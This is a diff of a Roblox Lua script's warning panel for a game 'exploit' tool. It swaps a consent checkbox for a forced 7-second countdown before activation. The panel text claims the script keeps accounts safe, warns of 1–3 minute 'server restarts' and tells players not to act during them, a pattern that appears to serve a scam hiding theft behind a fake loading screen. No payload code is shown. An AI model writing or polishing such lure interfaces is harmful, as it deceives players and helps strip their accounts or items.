@@ -90,7 +90,7 @@ warningTitle.LayoutOrder = 1
 
 local description = Instance.new("TextLabel")
 description.Name = "Description"
-description.Text = "Before you can have the access for the exploits. I wanted you to understand that the script you are executing are very sensitive towards servers, now keep in mind that it does the job done but it also assures your account safety. Therefore script will conduct several server restarts during the execution of the scripts/exploits and server restarts will only lasts for approximately 1min to 3mins, making sure you are in the safe server. Now, why does the script server restarts, well its because game light-ban their players by disabling the gifting feature for the account (ex. Trade Failed, Data Loss). During the server restart please refrain from doing anything to keep your account totally safe. If you agree please proceed to tick the check box below this message and press Activate button. Enjoy and Goodluck ;)"
+description.Text = "Before you can have the access for the exploits. I wanted you to understand that the script you are executing are very sensitive towards servers, now keep in mind that it does the job done but it also assures your account safety. Therefore script will conduct several server restarts during the execution of the scripts/exploits and server restarts will only lasts for approximately 1min to 3mins, making sure you are in the safe server. Now, why does the script server restarts, well its because game light-ban their players by disabling the gifting feature for the account (ex. Trade Failed, Data Loss). During the server restart please refrain from doing anything to keep your account totally safe. Please wait 7 seconds before activating. Enjoy and Goodluck ;)"
 description.Font = Enum.Font.Gotham
 description.TextSize = 14
 description.TextColor3 = Color3.fromRGB(220, 220, 220)
@@ -101,40 +101,16 @@ description.TextXAlignment = Enum.TextXAlignment.Justify
 description.AutomaticSize = Enum.AutomaticSize.Y
 description.LayoutOrder = 2
 
-local checkFrame = Instance.new("Frame")
-checkFrame.Name = "CheckFrame"
-checkFrame.BackgroundTransparency = 1
-checkFrame.Size = UDim2.new(1, 0, 0, 25)
-checkFrame.LayoutOrder = 3
-
-local checkbox = Instance.new("TextButton")
-checkbox.Name = "CheckBox"
-checkbox.Text = ""
-checkbox.Size = UDim2.new(0, 25, 0, 25)
-checkbox.Position = UDim2.new(0, 0, 0, 0)
-checkbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-checkbox.AutoButtonColor = false
-
-local checkmark = Instance.new("TextLabel")
-checkmark.Name = "Checkmark"
-checkmark.Text = "✓"
-checkmark.Font = Enum.Font.SourceSansBold
-checkmark.TextSize = 25
-checkmark.TextColor3 = Color3.fromRGB(0, 200, 0)
-checkmark.BackgroundTransparency = 1
-checkmark.Size = UDim2.new(1, 0, 1, 0)
-checkmark.Visible = false
-
-local checkText = Instance.new("TextLabel")
-checkText.Name = "CheckText"
-checkText.Text = "I understood completely, I wish to continue."
-checkText.Font = Enum.Font.Gotham
-checkText.TextSize = 14
-checkText.TextColor3 = Color3.fromRGB(200, 200, 200)
-checkText.BackgroundTransparency = 1
-checkText.Size = UDim2.new(1, -30, 1, 0)
-checkText.Position = UDim2.new(0, 30, 0, 0)
-checkText.TextXAlignment = Enum.TextXAlignment.Left
+local timerText = Instance.new("TextLabel")
+timerText.Name = "TimerText"
+timerText.Text = "Activation available in: 7 seconds"
+timerText.Font = Enum.Font.Gotham
+timerText.TextSize = 14
+timerText.TextColor3 = Color3.fromRGB(255, 150, 50)
+timerText.BackgroundTransparency = 1
+timerText.Size = UDim2.new(1, 0, 0, 20)
+timerText.TextXAlignment = Enum.TextXAlignment.Center
+timerText.LayoutOrder = 3
 
 local activateButton = Instance.new("TextButton")
 activateButton.Name = "ActivateButton"
@@ -211,21 +187,6 @@ local pulseTween = tweenService:Create(
 )
 pulseTween:Play()
 
-checkbox.MouseButton1Click:Connect(function()
-    checkmark.Visible = not checkmark.Visible
-    activateButton.Active = checkmark.Visible
-    
-    if checkmark.Visible then
-        activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        activateButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        buttonStroke.Color = Color3.fromRGB(100, 100, 100)
-    else
-        activateButton.TextColor3 = Color3.fromRGB(150, 150, 150)
-        activateButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        buttonStroke.Color = Color3.fromRGB(70, 70, 70)
-    end
-end)
-
 activateButton.MouseEnter:Connect(function()
     if activateButton.Active then
         activateButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
@@ -240,10 +201,31 @@ activateButton.MouseLeave:Connect(function()
     end
 end)
 
-checkmark.Parent = checkbox
-checkbox.Parent = checkFrame
-checkText.Parent = checkFrame
-checkFrame.Parent = contentFrame
+-- Timer countdown function
+local function startCountdown()
+    local seconds = 7
+    timerText.Text = "Activation available in: " .. seconds .. " seconds"
+    
+    while seconds > 0 do
+        wait(1)
+        seconds = seconds - 1
+        timerText.Text = "Activation available in: " .. seconds .. " seconds"
+    end
+    
+    timerText.Text = "Activation available now!"
+    timerText.TextColor3 = Color3.fromRGB(0, 200, 0)
+    
+    -- Enable the button
+    activateButton.Active = true
+    activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    activateButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    buttonStroke.Color = Color3.fromRGB(100, 100, 100)
+end
+
+-- Start the countdown
+startCountdown()
+
+timerText.Parent = contentFrame
 activateButton.Parent = contentFrame
 description.Parent = contentFrame
 warningTitle.Parent = contentFrame
